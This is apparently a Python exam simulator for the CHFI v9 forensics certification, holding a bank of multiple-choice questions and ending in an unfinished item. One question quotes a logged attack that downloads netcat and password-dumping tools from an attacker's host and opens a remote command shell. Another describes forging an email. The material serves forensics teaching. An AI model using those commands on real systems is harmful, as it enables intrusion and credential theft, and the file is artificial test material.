# _*_ coding:utf-8 _*_

import random 


print("""
 .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. |
| |     ______   | || |  ____  ____  | || |  _________   | || |     _____    | |
| |   .' ___  |  | || | |_   ||   _| | || | |_   ___  |  | || |    |_   _|   | |
| |  / .'   \_|  | || |   | |__| |   | || |   | |_  \_|  | || |      | |     | |
| |  | |         | || |   |  __  |   | || |   |  _|      | || |      | |     | |
| |  \ `.___.'\  | || |  _| |  | |_  | || |  _| |_       | || |     _| |_    | |
| |   `._____.'  | || | |____||____| | || | |_____|      | || |    |_____|   | |
| |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  
              Computer Hacking Forensic Investigator V9 simulator
        +------------------------------------------------------------+
        |  This software is free, software developed by catx003_     |
        +------------------- ♥ For donations ♥ ----------------------+
        |                                                            |
        |      ŁTC = LPE5DsjA2YcMuGGZspvRzEEvdoAjvTRzvF              |
        |      ɃTC = 1FtBj9QbT7gDcxSCygTnUop4N3bd75bwRZ              |
        |      ɃCH = qr6gn0r20p9s9kjm5yuvqw53mhmzx87q0vecqn6xhj      |
        |                                                            |
        +------------------------------------------------------------+           
""" + "\n ")



questions = { 0: "Wellcome to CHFI v9", 1 : """When an investigator contacts by telephone the domain administrator or controller listed by a Who is
lookup to request all e-mails sent and received for a user account be preserved, what U.S.C. statute
authorizes this phone call and obligates the ISP to preserve e-mail records?

A. Title 18, Section 1030
B. Title 18, Section 2703(d)
C. Title 18, Section Chapter 90
D. Title 18, Section 2703(f) """,

2 : """Item 2If you come across a sheepdip machine at your client site, what would you infer?

A. A sheepdip coordinates several honeypots
B. A sheepdip computer is another name for a honeypot
C. A sheepdip computer is used only for virus-checking.
D. A sheepdip computer defers a denial of service attack""",

3 : """In a computer forensics investigation, what describes the route that evidence takes from the time you find it
until the case is closed or goes to court?

A. rules of evidence
B. law of probability
C. chain of custody
D. policy of separation """,

4 : """How many characters long is the fixed-length MD5 algorithm checksum of a critical system file?

A. 128
B. 64
C. 32
D. 16""",

5 : """You are working on a thesis for your doctorate degree in Computer Science. Your thesis is based on
HTML, DHTML, and other web-based languages and how they have evolved over the years.
You navigate to archive. org and view the HTML code of news.com. You then navigate to the current
news.com website and copy over the source code. While searching through the code, you come across
something abnormal: What have you found?

A. Web bug
B. CGI code
C. Trojan.downloader
D. Blind bug""",

6 : """You are using DriveSpy, a forensic tool and want to copy 150 sectors where the starting sector is 1709 on
the primary hard drive. Which of the following formats correctly specifies these sectors?

A. 0:1000, 150
B. 0:1709, 150
C. 1:1709, 150
D. 0:1709-1858""",

7 : """A honey pot deployed with the IP 172.16.1.108 was compromised by an attacker. Given below is an
excerpt from a Snort binary capture of the attack. Decipher the activity carried out by the attacker by
studying the log. Please note that you are required to infer only what is explicit in the excerpt.
(Note: The student is being tested on concepts learnt during passive OS fingerprinting, basic TCP/IP
connection concepts and the ability to read packet signatures from a sniff dump.)

03/15-20:21:24.107053 211.185.125.124:3500 -> 172.16.1.108:111
TCP TTL:43 TOS:0x0 ID:29726 IpLen:20 DgmLen:52 DF
***A**** Seq: 0x9B6338C5 Ack 0x5820ADD0 Win: 0x7D78 TcpLen: 32
TCP Options (3) => NOP NOP TS 23678634 2878772
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
03/15-20:21:24.452051 211.185.125.124:789 -> 172.16.1.103:111
UDP TTL:43 TOS:0x0 ID:29733 IpLen:20 DgmLen:84
Len: 64
01 0A 8A 0A 00 00 00 00 00 00 00 02 00 01 86 A0 ................
00 00 00 02 00 00 00 03 00 00 00 00 00 00 00 00 ................
00 00 00 00 00 00 00 00 00 01 86 B8 00 00 00 01 ................
00 00 00 11 00 00 00 00 ........
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
03/15-20:21:24.730436 211.185.125.124:790 -> 172.16.1.103:32773

UDP TTL:43 TOS:0x0 ID:29781 IpLen:20 DgmLen:1104
Len: 1084
47 F7 9F 63 00 00 00 00 00 00 00 02 00 01 86 B8

A. The attacker has conducted a network sweep on port 111
B. The attacker has scanned and exploited the system using Buffer Overflow
C. The attacker has used a Trojan on port 32773
D. The attacker has installed a backdoor""",

8 : """The newer Macintosh Operating System is based on:

A. OS/2
B. BSD Unix
C. Linux
D. Microsoft Windows""",

9 : """Before you are called to testify as an expert, what must an attorney do first?

A. engage in damage control
B. prove that the tools you used to conduct your examination are perfect
C. read your curriculum vitae to the jury
D. qualify you as an expert witness""",

10 : """You are contracted to work as a computer forensics investigator for a regional bank that has four 30 TB
storage area networks that store customer data.
What method would be most efficient for you to acquire digital evidence from this network?

A. create a compressed copy of the file with DoubleSpace
B. create a sparse data copy of a folder or file
C. make a bit-stream disk-to-image file
D. make a bit-stream disk-to-disk file""",

11 : """You are working for a large clothing manufacturer as a computer forensics investigator and are called in to
investigate an unusual case of an employee possibly stealing clothing designs from the company and
selling them under a different brand name for a different company. What you discover during the course of
the investigation is that the clothing designs are actually original products of the employee and the
company has no policy against an employee selling his own designs on his own time. The only thing that
you can find that the employee is doing wrong is that his clothing design incorporates the same graphic
symbol as that of the company with only the wording in the graphic being different. What area of the law is
the employee violating?

A. trademark law
B. copyright law
C. printright law
D. brandmark law""",

12 : """What file structure database would you expect to find on floppy disks?

A. NTFS
B. FAT32
C. FAT16
D. FAT12""",

13 : """What type of attack occurs when an attacker can force a router to stop forwarding packets by flooding the
router with many open connections simultaneously so that all the hosts behind the router are effectively
disabled?

A. digital attack
B. denial of service
C. physical attack
D. ARP redirect""",

14 : """When examining a file with a Hex Editor, what space does the file header occupy?

A. the last several bytes of the file
B. the first several bytes of the file
C. none, file headers are contained in the FAT
D. one byte at the beginning of the file""",

15 : """In the context of file deletion process, which of the following statement holds true?

A. When files are deleted, the data is overwritten and the cluster marked as available
B. The longer a disk is in use, the less likely it is that deleted files will be overwritten
C. While booting, the machine may create temporary files that can delete evidence
D. Secure delete programs work by completely overwriting the file in one go""",

16 : """A suspect is accused of violating the acceptable use of computing resources, as he has visited adult
websites and downloaded images. The investigator wants to demonstrate that the suspect did indeed visit
these sites. However, the suspect has cleared the search history and emptied the cookie cache. Moreover,
he has removed any images he might have downloaded. What can the investigator do to prove the
violation?

A. Image the disk and try to recover deleted files
B. Seek the help of co-workers who are eye-witnesses
C. Check the Windows registry for connection data (you may or may not recover)
D. Approach the websites for evidence""",

17 : """A(n) _____________________ is one that's performed by a computer program rather than the attacker
manually performing the steps in the attack sequence.

A. blackout attack
B. automated attack
C. distributed attack
D. central processing attack""",

18 : """The offset in a hexadecimal code is:

A. The last byte after the colon
B. The 0x at the beginning of the code
C. The 0x at the end of the code
D. The first byte after the colon""",

19 : """It takes _____________ mismanaged case/s to ruin your professional reputation as a computer forensics
examiner?

A. by law, three
B. quite a few
C. only one
D. at least two""",

20 : """With the standard Linux second extended file system (Ext2fs), a file is deleted when the inode internal link
count reaches ________.

A. 0
B. 10
C. 100
D. 1""",

21 : """When examining the log files from a Windows IIS Web Server, how often is a new log file created?

A. the same log is used at all times
B. a new log file is created everyday
C. a new log file is created each week
D. a new log is created each time the Web Server is started""",

22 : """Which part of the Windows Registry contains the user's password file?

A. HKEY_LOCAL_MACHINE
B. HKEY_CURRENT_CONFIGURATION
C. HKEY_USER
D. HKEY_CURRENT_USER""",

23 : """An employee is attempting to wipe out data stored on a couple of compact discs (CDs) and digital video
discs (DVDs) by using a large magnet. You inform him that this method will not be effective in wiping out
the data because CDs and DVDs are ______________ media used to store large amounts of data and are
not affected by the magnet.

A. logical
B. anti-magnetic
C. magnetic
D. optical""",

24 : """Lance wants to place a honeypot on his network. Which of the following would be your recommendations?

A. Use a system that has a dynamic addressing on the network
B. Use a system that is not directly interacting with the router
C. Use it on a system in an external DMZ in front of the firewall
D. It doesn't matter as all replies are faked""",

25 : """What does the acronym POST mean as it relates to a PC?

A. Primary Operations Short Test
B. PowerOn Self Test
C. Pre Operational Situation Test
D. Primary Operating System Test""",

26 : """Which legal document allows law enforcement to search an office, place of business, or other locale for
evidence relating to an alleged crime?

A. bench warrant
B. wire tap
C. subpoena
D. search warrant""",

27 : """You are working as an investigator for a corporation and you have just received instructions from your
manager to assist in the collection of 15 hard drives that are part of an ongoing investigation.
Your job is to complete the required evidence custody forms to properly document each piece of evidence
as it is collected by other members of your team. Your manager instructs you to complete one multi-
evidence form for the entire case and a single-evidence form for each hard drive. How will these forms be
stored to help preserve the chain of custody of the case?

A. All forms should be placed in an approved secure container because they are now primary evidence in
the case.
B. The multi-evidence form should be placed in the report file and the single-evidence forms should be
kept with each hard drive in an approved secure container.
C. The multi-evidence form should be placed in an approved secure container with the hard drives and the
single-evidence forms should be placed in the report file.
D. All forms should be placed in the report file because they are now primary evidence in the case.""",

28 : """The MD5 program is used to:

A. wipe magnetic media before recycling it
B. make directories on an evidence disk
C. view graphics files on an evidence drive
D. verify that a disk is not altered when you examine it""",

29 : """Which is a standard procedure to perform during all computer forensics investigations?

A. with the hard drive removed from the suspect PC, check the date and time in the system's CMOS
B. with the hard drive in the suspect PC, check the date and time in the File Allocation Table
C. with the hard drive removed from the suspect PC, check the date and time in the system's RAM
D. with the hard drive in the suspect PC, check the date and time in the system's CMOS""",

30 : """E-mail logs contain which of the following information to help you in your investigation? (Choose four.)
A. user account that was used to send the account
B. attachments sent with the e-mail message
C. unique message identifier
D. contents of the e-mail message
E. date and time the message was sent""",

31 : """In a forensic examination of hard drives for digital evidence, what type of user is most likely to have the
most file slack to analyze?
A. one who has NTFS 4 or 5 partitions
B. one who uses dynamic swap file capability
C. one who uses hard disk writes on IRQ 13 and 21
D. one who has lots of allocation units per block or cluster""",

32 : """In what way do the procedures for dealing with evidence in a criminal case differ from the procedures for
dealing with evidence in a civil case?

A. evidence must be handled in the same way regardless of the type of case
B. evidence procedures are not important unless you work for a law enforcement agency
C. evidence in a criminal case must be secured more tightly than in a civil case
D. evidence in a civil case must be secured more tightly than in a criminal case""",

33 : """You are assigned to work in the computer forensics lab of a state police agency. While working on a high
profile criminal case, you have followed every applicable procedure, however your boss is still concerned
that the defense attorney might "whether evidence has been changed while at the lab. What can
you do to prove that the evidence is the same as it was when it first entered the lab?

A. make an MD5 hash of the evidence and compare it with the original MD5 hash that was taken when the
evidence first entered the lab
B. make an MD5 hash of the evidence and compare it to the standard database developed by NIST
C. there is no reason to worry about this possible claim because state labs are certified
D. sign a statement attesting that the evidence is the same as it was when it entered the lab""",

34 : """Study the log given below and answer the following question

Apr 24 14:46:46 [4663]: spp_portscan: portscan detected from 194.222.156.169
Apr 24 14:46:46 [4663]: IDS27/FIN Scan: 194.222.156.169:56693 -> 172.16.1.107:482
Apr 24 18:01:05 [4663]: IDS/DNS-version-query: 212.244.97.121:3485 -> 172.16.1.107:53
Apr 24 19:04:01 [4663]: IDS213/ftp-passwd-retrieval: 194.222.156.169:1425 -> 172.16.1.107:21
Apr 25 08:02:41 [5875]: spp_portscan: PORTSCAN DETECTED from 24.9.255.53
Apr 25 02:08:07 [5875]: IDS277/DNS-version-query: 63.226.81.13:4499 -> 172.16.1.107:53
Apr 25 02:08:07 [5875]: IDS277/DNS-version-query: 63.226.81.13:4630 -> 172.16.1.101:53
Apr 25 02:38:17 [5875]: IDS/RPC-rpcinfo-query: 212.251.1.94:642 -> 172.16.1.107:111
Apr 25 19:37:32 [5875]: IDS230/web-cgi-space-wildcard: 198.173.35.164:4221 -> 172.16.1.107:80
Apr 26 05:45:12 [6283]: IDS212/dns-zone-transfer: 38.31.107.87:2291 -> 172.16.1.101:53
Apr 26 06:43:05 [6283]: IDS181/nops-x86: 63.226.81.13:1351 -> 172.16.1.107:53
Apr 26 06:44:25 victim7 PAM_pwdb[12509]: (login) session opened for user simple by (uid=0)
Apr 26 06:44:36 victim7 PAM_pwdb[12521]: (su) session opened for user simon by simple(uid=506)
Apr 26 06:45:34 [6283]: IDS175/socks-probe: 24.112.167.35:20 -> 172.16.1.107:1080
Apr 26 06:52:10 [6283]: IDS127/telnet-login-incorrect: 172.16.1.107:23 -> 213.28.22.189:4558
Precautionary measures to prevent this attack would include writing firewall rules. Of these firewall rules,
which among the following would be appropriate?

A. Disallow UDP53 in from outside to DNS server
B. Allow UDP53 in from DNS server to outside
C. Disallow TCP53 in from secondaries or ISP server to DNS server
D. Block all UDP traffic""",

35 : """When monitoring for both intrusion and security events between multiple computers, it is essential that the
computers' clocks are synchronized. Synchronized time allows an administrator to reconstruct what took
place during an attack against multiple computers. Without synchronized time, it is very difficult to
determine exactly when specific events took place, and how events interlace. What is the name of the
service used to synchronize time among multiple computers?

A. Universal Time Set
B. Network Time Protocol
C. SyncTime Service
D. Time-Sync Protocol""",

36 : """When investigating a potential e-mail crime, what is your first step in the investigation?

A. Trace the IP address to its origin
B. Write a report
C. Determine whether a crime was actually committed
D. Recover the evidence""",

37 : """If a suspect computer is located in an area that may have toxic chemicals, you must:

A. coordinate with the HAZMAT team
B. determine a way to obtain the suspect computer
C. assume the suspect machine is contaminated
D. do not enter alone""",

38 : """The following excerpt is taken from a honeypot log. The log captures activities across three days.
There are several intrusion attempts; however, a few are successful.
Note: The objective of this "is to test whether the student can read basic information from log
entries and interpret the nature of attack.

Apr 24 14:46:46 [4663]: spp_portscan: portscan detected from 194.222.156.169
Apr 24 14:46:46 [4663]: IDS27/FIN Scan: 194.222.156.169:56693 -> 172.16.1.107:482
Apr 24 18:01:05 [4663]: IDS/DNS-version-query: 212.244.97.121:3485 -> 172.16.1.107:53
Apr 24 19:04:01 [4663]: IDS213/ftp-passwd-retrieval: 194.222.156.169:1425 -> 172.16.1.107:21
Apr 25 08:02:41 [5875]: spp_portscan: PORTSCAN DETECTED from 24.9.255.53
Apr 25 02:08:07 [5875]: IDS277/DNS-version-query: 63.226.81.13:4499 -> 172.16.1.107:53
Apr 25 02:08:07 [5875]: IDS277/DNS-version-query: 63.226.81.13:4630 -> 172.16.1.101:53
Apr 25 02:38:17 [5875]: IDS/RPC-rpcinfo-query: 212.251.1.94:642 -> 172.16.1.107:111
Apr 25 19:37:32 [5875]: IDS230/web-cgi-space-wildcard: 198.173.35.164:4221 -> 172.16.1.107:80
Apr 26 05:45:12 [6283]: IDS212/dns-zone-transfer: 38.31.107.87:2291 -> 172.16.1.101:53
Apr 26 06:43:05 [6283]: IDS181/nops-x86: 63.226.81.13:1351 -> 172.16.1.107:53
Apr 26 06:44:25 victim7 PAM_pwdb[12509]: (login) session opened for user simple by (uid=0)
Apr 26 06:44:36 victim7 PAM_pwdb[12521]: (su) session opened for user simon by simple(uid=506)
Apr 26 06:45:34 [6283]: IDS175/socks-probe: 24.112.167.35:20 -> 172.16.1.107:1080
Apr 26 06:52:10 [6283]: IDS127/telnet-login-incorrect: 172.16.1.107:23 -> 213.28.22.189:4558
From the options given below choose the one which best interprets the following entry:
Apr 26 06:43:05 [6283]: IDS181/nops-x86: 63.226.81.13:1351 -> 172.16.1.107:53

A. An IDS evasion technique
B. A buffer overflow attempt
C. A DNS zone transfer
D. Data being retrieved from 63.226.81.13""",

39 : """What happens when a file is deleted by a Microsoft operating system using the FAT file system?

A. only the reference to the file is removed from the FAT
B. the file is erased and cannot be recovered
C. a copy of the file is stored and the original file is erased
D. the file is erased but can be recovered""",

40 : """The following excerpt is taken from a honeypot log that was hosted at lab.wiretrip.net. Snort reported
Unicode attacks from 213.116.251.162. The File Permission Canonicalization vulnerability (UNICODE
attack) allows scripts to be run in arbitrary folders that do not normally have the right to run scripts. The
attacker tries a Unicode attack and eventually succeeds in displaying boot.ini.
He then switches to playing with RDS, via msadcs.dll. The RDS vulnerability allows a malicious user to
construct SQL statements that will execute shell commands (such as CMD.EXE) on the IIS server. He
does a quick query to discover that the directory exists, and a query to msadcs.dll shows that it is
functioning correctly. The attacker makes a RDS query which results in the commands run as shown
below.
"cmd1.exe /c open 213.116.251.162 >ftpcom"
"cmd1.exe /c echo johna2k >>ftpcom"
"cmd1.exe /c echo haxedj00 >>ftpcom"
"cmd1.exe /c echo get nc.exe >>ftpcom"
"cmd1.exe /c echo get pdump.exe >>ftpcom"
"cmd1.exe /c echo get samdump.dll >>ftpcom"
"cmd1.exe /c echo quit >>ftpcom"
"cmd1.exe /c ftp -s:ftpcom"
"cmd1.exe /c nc -l -p 6969 -e cmd1.exe"
What can you infer from the exploit given?

A. It is a local exploit where the attacker logs in using username johna2k
B. There are two attackers on the system - johna2k and haxedj00
C. The attack is a remote exploit and the hacker downloads three files
D. The attacker is unsuccessful in spawning a shell as he has specified a high end UDP port""",


41 : """What term is used to describe a cryptographic technique for embedding information into something else for
the sole purpose of hiding that information from the casual observer?

A. rootkit
B. key escrow
C. steganography
D. Offset""",

42 : """During the course of an investigation, you locate evidence that may prove the innocence of the suspect of
the investigation. You must maintain an unbiased opinion and be objective in your entire fact finding
process. Therefore, you report this evidence. This type of evidence is known as:

A. Inculpatory evidence
B. Mandatory evidence
C. Exculpatory evidence
D. Terrible evidence""",

43 : """If you discover a criminal act while investigating a corporate policy abuse, it becomes a publicsector
investigation and should be referred to law enforcement?

A. true
B. false""",

44 : """What binary coding is used most often for e-mail purposes?

A. MIME
B. Uuencode
C. IMAP
D. SMTP""",

45 : """If you see the files Zer0.tar.gz and copy.tar.gz on a Linux system while doing an investigation, what can you
conclude?

A. The system files have been copied by a remote attacker
B. The system administrator has created an incremental backup
C. The system has been compromised using a t0rnrootkit
D. Nothing in particular as these can be operational files""",

46 : """From the following spam mail header, identify the host IP that sent this spam?

From jie02@netvigator.com jie02@netvigator.com Tue Nov 27 17:27:11 2001
Received: from viruswall.ie.cuhk.edu.hk (viruswall [137.189.96.52]) by eng.ie.cuhk.edu.hk
(8.11.6/8.11.6) with ESMTP id
fAR9RAP23061 for ; Tue, 27 Nov 2001 17:27:10 +0800 (HKT)
Received: from mydomain.com (pcd249020.netvigator.com [203.218.39.20]) by
viruswall.ie.cuhk.edu.hk (8.12.1/8.12.1)
with SMTP id fAR9QXwZ018431 for ; Tue, 27 Nov 2001 17:26:36 +0800 (HKT)
Message-Id: >200111270926.fAR9QXwZ018431@viruswall.ie.cuhk.edu.hk
From: "china hotel web"
To: "Shlam"
Subject: SHANGHAI (HILTON HOTEL) PACKAGE
Date: Tue, 27 Nov 2001 17:25:58 +0800 MIME-Version: 1.0

X-Priority: 3 X-MSMail-
Priority: Normal

Reply-To: "china hotel web"

A. 137.189.96.52
B. 8.12.1.0
C. 203.218.39.20
D. 203.218.39.50""",

47:"""If you plan to startup a suspect's computer, you must modify the ___________ to ensure that you do not
contaminate or alter data on the suspect's hard drive by booting to the hard drive.

A. deltree command
B. CMOS
C. Boot.sys
D. Scandisk utility""",

48 : """You are working for a local police department that services a population of 1,000,000 people and you have
been given the task of building a computer forensics lab. How many law-enforcement computer
investigators should you request to staff the lab?

A. 8
B. 1
C. 4
D. 2""",

49 : """When obtaining a warrant, it is important to:

A. particularlydescribe the place to be searched and particularly describe the items to be seized
B. generallydescribe the place to be searched and particularly describe the items to be seized
C. generallydescribe the place to be searched and generally describe the items to be seized
D. particularlydescribe the place to be searched and generally describe the items to be seized""",

50 : """What does the superblock in Linux define?

A. filesynames
B. diskgeometr
C. location of the firstinode
D. available space""",

51 : """Diskcopy is:

A. a utility by AccessData
B. a standard MS-DOS command
C. Digital Intelligence utility
D. dd copying tool""",

52 : """Sectors in hard disks typically contain how many bytes?

A. 256
B. 512
C. 1024
D. 2048""",

53 : """Area density refers to:

A. the amount of data per disk
B. the amount of data per partition
C. the amount of data per square inch
D. the amount of data per platter""",

54 : """Corporate investigations are typically easier than public investigations because:

A. the users have standard corporate equipment and software
B. the investigator does not have to get a warrant
C. the investigator has to get a warrant
D. the users can load whatever they want on their machines""",

55 : """Which of the following should a computer forensics lab used for investigations have?

A. isolation
B. restricted access
C. open access
D. an entry log""",

56 : """Jason is the security administrator of ACMA metal Corporation. One day he notices the company's Oracle
database server has been compromised and the customer information along with financial data has been
stolen. The financial loss will be in millions of dollars if the database gets into the hands of the competitors.
Jason wants to report this crime to the law enforcement agencies immediately.
Which organization coordinates computer crimes investigations throughout the United States?

A. Internet Fraud Complaint Center
B. Local or national office of the U.S. Secret Service
C. National Infrastructure Protection Center
D. CERT Coordination Center""",

57 : """Which Intrusion Detection System (IDS) usually produces the most false alarms due to the unpredictable
behaviors of users and networks?

A. network-based IDS systems (NIDS)
B. host-based IDS systems (HIDS)
C. anomaly detection
D. signature recognition""",

58 : """You should make at least how many bit-stream copies of a suspect drive?

A. 1
B. 2
C. 3
D. 4""",

59 : """Why should you note all cable connections for a computer you want to seize as evidence?

A. to know what outside connections existed
B. in case other devices were connected
C. to know what peripheral devices exist
D. to know what hardware existed""",

60 : """What header field in the TCP/IP protocol stack involves the hacker exploit known as the Ping of Death?

A. ICMP header field
B. TCP header field
C. IP header field
D. UDP header field""",

61 : """
What method of computer forensics will allow you to trace all ever-established user accounts on a
Windows 2000 sever the course of its lifetime?

A. forensic duplication of hard drive
B. analysis of volatile data
C. comparison of MD5 checksums
D. review of SIDs in the Registry""",

62:"""Which response organization tracks hoaxes as well as viruses?

A. NIPC
B. FEDCIRC
C. CERT
D. CIAC""",

63 : """
Which federal computer crime law specifically refers to fraud and related activity in connection with access
devices like routers?

A. 18 U.S.C. 1029
B. 18 U.S.C. 1362
C. 18 U.S.C. 2511
D. 18 U.S.C. 2703""",

64 : """

Office documents (Word, Excel, PowerPoint) contain a code that allows tracking the MAC, or unique
identifier, of the machine that created the document. What is that code called?

A. the Microsoft Virtual Machine Identifier
B. the Personal Application Protocol
C. the Globally Unique ID
D. the Individual ASCII String""",

65 : """
What TCP/UDP port does the toolkit program netstat use?

A. Port 7
B. Port 15
C. Port 23
D. Port 69
""",

66 : """
Under which Federal Statutes does FBI investigate for computer crimes involving e-mail scams and mail
fraud?

A. 18 U.S.C. 1029 Possession of Access Devices
B. 18 U.S.C. 1030 Fraud and related activity in connection with computers
C. 18 U.S.C. 1343 Fraud by wire, radio or television
D. 18 U.S.C. 1361 Injury to Government Property
E. 18 U.S.C. 1362 Government communication systems
F. 18 U.S.C. 1831 Economic Espionage Act
G. 18 U.S.C. 1832 Trade Secrets Act""",

67 : """
In a FAT32 system, a 123 KB file will use how many sectors?

A. 34
B. 25
C. 11
D. 56""",

68 : """
You have been asked to investigate the possibility of computer fraud in the finance department of a
company. It is suspected that a staff member has been committing finance fraud by printing cheques that
have not been authorized. You have exhaustively searched all data files on a bitmap image of the target
computer, but have found no evidence. You suspect the files may not have been saved. What should you
examine next in this case?

A. The registry
B. The swap file
C. The recycle bin
D. The metadata""",

69 : """
When performing a forensics analysis, what device is used to prevent the system from recording data on

an evidence disk?

A. a write-blocker
B. a protocol analyzer
C. a firewall
D. a disk editor""",

70 : """
How many sectors will a 125 KB file use in a FAT32 file system?

A. 32
B. 16
C. 256
D. 25""",

71 : """
You are called by an author who is writing a book and he wants to know how long the copyright for his book
will last after he has the book published?

A. 70 years
B. the life of the author
C. the life of the author plus 70 years
D. copyrights last forever""",

72 : """
When investigating a network that uses DHCP to assign IP addresses, where would you look to determine
which system (MAC address) had a specific IP address at a specific time?

A. on the individual computer's ARP cache
B. in the Web Server log files
C. in the DHCP Server log files
D. there is no way to determine the specific IP address""",

73 : """
Bob has been trying to penetrate a remote production system for the past two weeks. This time however,
he is able to get into the system. He was able to use the System for a period of three weeks. However, law
enforcement agencies were recoding his every activity and this was later presented as evidence.
The organization had used a Virtual Environment to trap Bob. What is a Virtual Environment?

A. A Honeypot that traps hackers
B. A system Using Trojaned commands
C. An environment set up after the user logs in
D. An environment set up before a user logs in""",

74 : """
To make sure the evidence you recover and analyze with computer forensics software can be admitted in
court, you must test and validate the software. What group is actively providing tools and creating
procedures for testing and validating computer forensics software?

A. Computer Forensics Tools and Validation Committee (CFTVC)
B. Association of Computer Forensics Software Manufactures (ACFSM)
C. National Institute of Standards and Technology (NIST)
D. Society for Valid Forensics Tools and Testing (SVFTT)""",

75 : """
With Regard to using an Antivirus scanner during a computer forensics investigation, You should:

A. Scan the suspect hard drive before beginning an investigation
B. Never run a scan on your forensics workstation because it could change your systems configuration
C. Scan your forensics workstation at intervals of no more than once every five minutes during an
investigation
D. Scan your Forensics workstation before beginning an investigation""",

76 : """
Windows identifies which application to open a file with by examining which of the following?

A. The File extension
B. The file attributes
C. The file Signature at the end of the file
D. The file signature at the beginning of the file
""",

77 : """
You have used a newly released forensic investigation tool, which doesn't meet the Daubert Test, during a
case. The case has ended-up in court. What argument could the defense make to weaken your case?

A. The tool hasn't been tested by the International Standards Organization (ISO)
B. Only the local law enforcement should use the tool
C. The total has not been reviewed and accepted by your peers
D. You are not certified for using the tool""",

78 : """
Which of the following is NOT a graphics file?

A. Picture1.tga
B. Picture2.bmp
C. Picture3.nfo
D. Picture4.psd""",

79 : """
When conducting computer forensic analysis, you must guard against ______________ So that you
remain focused on the primary job and insure that the level of work does not increase beyond what was
originally expected.

A. Hard Drive Failure
B. Scope Creep
C. Unauthorized expenses
D. Overzealous marketing""",

80 : """
In General, __________________ Involves the investigation of data that can be retrieved from the hard
disk or other disks of a computer by applying scientific methods to retrieve the data.

A. Network Forensics
B. Data Recovery
C. Disaster Recovery
D. Computer Forensics""",
81 : """
When you carve an image, recovering the image depends on which of the following skills?

A. Recognizing the pattern of the header content
B. Recovering the image from a tape backup
C. Recognizing the pattern of a corrupt file
D. Recovering the image from the tape backup""",

82 : """
When a file is deleted by Windows Explorer or through the MS-DOS delete command, the operating
system inserts _______________ in the first letter position of the filename in the FAT database.

A. A Capital X
B. A Blank Space
C. The Underscore Symbol
D. The lowercase Greek Letter Sigma (s)""",

83 : """
While working for a prosecutor, what do you think you should do if the evidence you found appears to be
exculpatory and is not being released to the defense?

A. Keep the information of file for later review
B. Destroy the evidence
C. Bring the information to the attention of the prosecutor, his or her supervisor or finally to the judge
D. Present the evidence to the defense attorney""",

84 : """
In Microsoft file structures, sectors are grouped together to form:

A. Clusters
B. Drives
C. Bitstreams
D. Partitions""",

85 : """
What type of file is represented by a colon (:) with a name following it in the Master File Table of NTFS
disk?

A. A compressed file
B. A Data stream file
C. An encrypted file
D. A reserved file""",

86 : """
An Employee is suspected of stealing proprietary information belonging to your company that he had no
rights to possess. The information was stored on the Employees Computer that was protected with the
NTFS Encrypted File System (EFS) and you had observed him copy the files to a floppy disk just before
leaving work for the weekend. You detain the Employee before he leaves the building and recover the
floppy disks and secure his computer. Will you be able to break the encryption so that you can verify that
that the employee was in possession of the proprietary information?

A. EFS uses a 128-bit key that can't be cracked, so you will not be able to recover the information
B. When the encrypted file was copied to the floppy disk, it was automatically unencrypted, so you can
recover the information.
C. The EFS Revoked Key Agent can be used on the Computer to recover the information
D. When the Encrypted file was copied to the floppy disk, the EFS private key was also copied to the
floppy disk, so you can recover the information.""",

87 : """
When examining a hard disk without a write-blocker, you should not start windows because Windows will
write data to the:

A. Recycle Bin
B. MSDOS.sys
C. BIOS
D. Case files""",

88 : """
You are called in to assist the police in an investigation involving a suspected drug dealer. The suspects
house was searched by the police after a warrant was obtained and they located a floppy disk in the
suspects bedroom. The disk contains several files, but they appear to be password protected. What are
two common methods used by password cracking software that you can use to obtain the password?

A. Limited force and library attack
B. Brute Force and dictionary Attack
C. Maximum force and thesaurus Attack
D. Minimum force and appendix Attack""",

89 : """
When reviewing web logs, you see an entry for resource not found in the HTTP status code filed.
What is the actual error code that you would see in the log for resource not found?

A. 202
B. 404
C. 505
D. 909""",

90 : """
Volatile Memory is one of the leading problems for forensics. Worms such as code Red are memory
resident and do write themselves to the hard drive, if you turn the system off they disappear. In a lab
environment, which of the following options would you suggest as the most appropriate to overcome the
problem of capturing volatile memory?

A. Use VMware to be able to capture the data in memory and examine it
B. Give the Operating System a minimal amount of memory, forcing it to use a swap file
C. Create a Separate partition of several hundred megabytes and place the swap file there
D. Use intrusion forensic techniques to study memory resident infections""",

91 : """
You are working in the security Department of law firm. One of the attorneys asks you about the topic of
sending fake email because he has a client who has been charged with doing just that. His client alleges
that he is innocent and that there is no way for a fake email to actually be sent. You inform the attorney that
his client is mistaken and that fake email is possibility and that you can prove it. You return to your desk
and craft a fake email to the attorney that appears to come from his boss. What port do you send the email
to on the company SMTP server?

A. 10
B. 25
C. 110
D. 135""",

92 : """
This is original file structure database that Microsoft originally designed for floppy disks. It is written to the
outermost track of a disk and contains information about each file stored on the drive.

A. Master Boot Record (MBR)
B. Master File Table (MFT)
C. File Allocation Table (FAT)
D. Disk Operating System (DOS)""",

93 : """
What should you do when approached by a reporter about a case that you are working on or have worked
on?

A. Refer the reporter to the attorney that retained you
B. Say, "no comment"
C. Answer all the reporter’s "s as completely as possible
D. Answer only the "s that help your case""",

94 : """
Which of the following refers to the data that might still exist in a cluster even though the original file has
been overwritten by another file?

A. Sector
B. Metadata
C. MFT
D. Slack Space""",

95 : """
A state department site was recently attacked and all the servers had their disks erased. The incident
response team sealed the area and commenced investigation. During evidence collection they came
across a zip disks that did not have the standard labeling on it. The incident team ran the disk on an
isolated system and found that the system disk was accidentally erased. They decided to call in the FBI for
further investigation. Meanwhile, they short listed possible suspects including three summer interns. Where
did the incident team go wrong?

A. They examined the actual evidence on an unrelated system
B. They attempted to implicate personnel without proof
C. They tampered with evidence by using it
D. They called in the FBI without correlating with the fingerprint data""",

96 : """
When investigating a Windows System, it is important to view the contents of the page or swap file
because:

A. Windows stores all of the systems configuration information in this file
B. This is file that windows use to communicate directly with Registry
C. A Large volume of data can exist within the swap file of which the computer user has no knowledge
D. This is the file that windows use to store the history of the last 100 commands that were run from the
command line""",

97 : """
